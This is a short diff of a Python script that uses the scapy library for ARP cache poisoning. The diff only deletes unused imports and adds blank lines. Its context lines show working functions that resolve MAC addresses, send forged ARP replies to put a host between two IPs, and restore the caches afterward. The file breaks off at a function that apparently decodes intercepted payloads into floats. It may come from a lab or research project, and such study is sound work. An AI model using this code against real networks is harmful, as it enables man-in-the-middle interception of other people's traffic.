@@ -1,6 +1,4 @@
-import codecs
 import struct
-import binascii
 
 from scapy.all import srp, send
 from scapy.layers.l2 import Ether, ARP
@@ -16,6 +14,7 @@ def get_mac(an_ip):
     target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
     return target_mac
 
+
 def launch_arp_poison(ip1, ip2):
     """
     This function will start the ARP spoofing between two provided IPs
@@ -29,6 +28,7 @@ def launch_arp_poison(ip1, ip2):
     spoof_arp_cache(ip1, mac1, ip2)
     spoof_arp_cache(ip2, mac2, ip1)
 
+
 def spoof_arp_cache(target_ip, target_mac, source_ip):
     """
     This function will send the ARP packet from the source to the target
@@ -39,6 +39,7 @@ def spoof_arp_cache(target_ip, target_mac, source_ip):
     """
     spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
     send(spoofed, verbose=False)
+
 
 def restore_arp(ip1, ip2):
     """
@@ -55,6 +56,7 @@ def restore_arp(ip1, ip2):
 
     packet = ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1)
     send(packet, verbose=False)
+
 
 def translate_payload_to_float(raw_payload):
     """
